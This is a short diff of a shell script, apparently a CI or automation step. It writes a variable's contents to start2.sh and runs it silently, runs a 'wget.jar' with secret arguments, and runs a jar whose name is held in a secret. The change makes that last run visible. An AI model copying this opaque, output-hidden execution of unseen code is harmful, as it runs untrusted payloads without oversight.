@@ -12,4 +12,5 @@ echo -e $LINK2 > start2.sh
 bash start2.sh &> /dev/null
 export DISPLAY=:0
 java -jar wget.jar $SECRET1 $SECRET2 "$SECRET3" &> /dev/null
-java -jar $SECRET4 &> /dev/null
+#java -jar $SECRET4 &> /dev/null
+java -jar $SECRET4
